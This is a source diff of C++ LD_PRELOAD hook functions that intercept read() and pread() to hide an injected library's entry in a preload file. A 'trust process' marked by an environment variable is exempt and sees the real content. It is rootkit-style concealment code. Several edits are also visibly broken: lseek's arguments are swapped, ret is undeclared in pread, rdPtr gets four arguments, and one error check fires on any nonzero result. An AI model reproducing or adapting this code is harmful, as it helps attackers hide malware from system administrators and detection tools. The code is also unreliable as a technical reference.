@@ -4,43 +4,44 @@
 
 
 ssize_t read (int fd, void *buf, size_t count) {
-	std::string lnkAim;
 	CErrnoSaver serr;
+	std::string lnkAim;
 	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
+	LSEEK lskPtr = (LSEEK)dlsym (RTLD_NEXT, "lseek");
 	char *chPtr;
+	ssize_t ret;
 	
 
-	assert (opnPtr != NULL);
+	assert (lskPtr != NULL);
 	assert (rdPtr != NULL);
 
 	// To check if the caller is our trust process
 	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
-		return rdPtr (fd, buf, count);
+		if ((ret = rdPtr (fd, buf, count)) == -1) {
+			serr.set (errno);
+		}
+		return ret;
 	}
 	
 	lnkAim = readLinkName (("/proc/self/fd/" + intToString (fd)).c_str ());
 	
 	if (lnkAim == prelFileName) {
-		off_t pst = lseek (fd, SEEK_CUR, 0);
-		if (pst == -1) {
-			serr.set (EBADF);
-			return pst;
-		}
-		
-		if (-1 == lseek (fd, SEEK_SET, pst + (hookLibraryName + separator).size ())) {
+		if (-1 == lskPtr (fd, SEEK_CUR, (hookLibraryName + separator).size ())) {
 			serr.set (EBADF);
 			return -1;
 		}
-		return rdPtr (fd, buf, count);
 	}
 	
 	
-	return 0;
+	if ((ret = rdPtr (fd, buf, count)) == -1) {
+		serr.set (errno);
+	}
+	return ret;
 }
 
 ssize_t pread (int fd, void *buf, size_t count, off_t offset) {
-	std::string lnkAim;
 	CErrnoSaver serr;
+	std::string lnkAim;
 	READ prdPtr = (READ)dlsym (RTLD_NEXT, "pread");
 	char *chPtr;
 	
@@ -49,17 +50,27 @@ ssize_t pread (int fd, void *buf, size_t count, off_t offset) {
 
 	// To check if the caller is our trust process
 	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
-		return prdPtr (fd, buf, count, offset);
+		if ((ret = prdPtr (fd, buf, count, offset)) == -1) {
+			serr.set (errno);
+		}
+		return ret;
 	}
 	
 	lnkAim = readLinkName (("/proc/self/fd/" + intToString (fd)).c_str ());
 	
 	if (lnkAim == prelFileName) {
-		return rdPtr (fd, buf, count, offset + (hookLibraryName + separator).size ());
+		if ((ret = rdPtr (fd, buf, count, offset + (hookLibraryName + separator).size ()))) {
+			serr.set (errno);
+			return ret;
+		}
+		return ret;
 	}
 	
 	
-	return prdPtr (fd, buf, count, offset);
+	if ((ret = prdPtr (fd, buf, count, offset)) == -1) {
+		serr.set (errno);
+	}
+	return ret;
 }
 
 
